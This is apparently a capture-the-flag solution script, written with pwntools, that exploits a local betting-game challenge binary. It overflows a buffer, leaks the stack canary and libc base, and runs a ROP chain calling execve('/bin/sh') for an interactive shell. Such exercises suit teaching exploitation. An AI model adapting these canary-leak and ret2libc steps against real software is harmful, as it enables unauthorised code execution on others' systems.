from pwn import *

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = elf.process()

# gdb.attach(p)
# pause()

def play_round(bet, feedback):
	p.sendlineafter(b"bet value: ", str(bet).encode())
	p.sendlineafter(b"guess: ", b"0")
	p.recvline()
	if (p.recv(10).startswith(b"Please")):
		p.sendafter(b"round: ", feedback)

# setting a bet that makes the money -1 to pass
# the size check for (money + 1 < 2048) and trigger a large read.
# overwriting `lives` and `money` to make the game loop continue.
# leak canary by overwriting its initial null-byte
play_round(1001, b"A" * (2048 + 9))
p.recvuntil(b"Lives: " + b"A" * 9)
canary = u64(b"\0" + p.recv(7))
log.success("canary = " + hex(canary))

# making the money -1 again by betting one more than what we overwrote money with.
# leak libc by writing non-null characters until just before the return address of main()
play_round(0x41414142, b"A" * (2048 + 8 * 3))
p.recvuntil(b"Lives: " + b"A" * 24)
libc_leak = u64(p.recvuntil(b"\n", drop = True).ljust(8, b"\0"))
libc.address = libc_leak - 0x29d90
log.success("libc @ " + hex(libc.address))

# simple execve("/bin/sh", 0, 0) ROP payload
rop = p64(libc.address + 0x2a3e5)	# pop rdi; ret
rop += p64(next(libc.search(b"/bin/sh\0")))
rop += p64(libc.address + 0x2be51) + p64(0)	# pop rsi ; ret => 0
rop += p64(libc.address + 0x796a2) + p64(0)	# pop rdx ; ret => 0
rop += p64(libc.sym["execve"])

# making our lives 0 so we exit the loop and return from main()
play_round(0x41414142, b"A" * 2048 + p64(0) + p64(canary) + p64(0) + rop)

p.interactive()
